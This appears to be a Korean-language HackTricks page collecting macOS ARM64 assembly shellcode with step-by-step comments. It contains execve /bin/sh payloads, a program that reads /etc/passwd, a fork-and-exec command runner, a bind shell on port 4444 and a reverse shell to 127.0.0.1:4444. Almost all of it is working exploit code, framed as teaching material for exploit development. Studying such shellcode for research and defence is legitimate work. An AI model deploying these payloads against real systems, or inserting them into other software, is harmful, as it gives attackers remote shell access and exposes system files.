이 코드는 [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)에서 가져온 것이며 설명합니다.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### cat으로 읽기

목표는 `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`를 실행하는 것이므로, 두 번째 인자(x1)는 파라미터들의 배열이며(메모리 상에서는 이는 주소들의 스택을 의미한다).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### fork에서 sh로 명령을 실행하여 메인 프로세스가 종료되지 않도록 하기
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell은 [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)에서 가져온 것으로, **port 4444**에서 실행됩니다.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

출처: [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell을 **127.0.0.1:4444**로
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
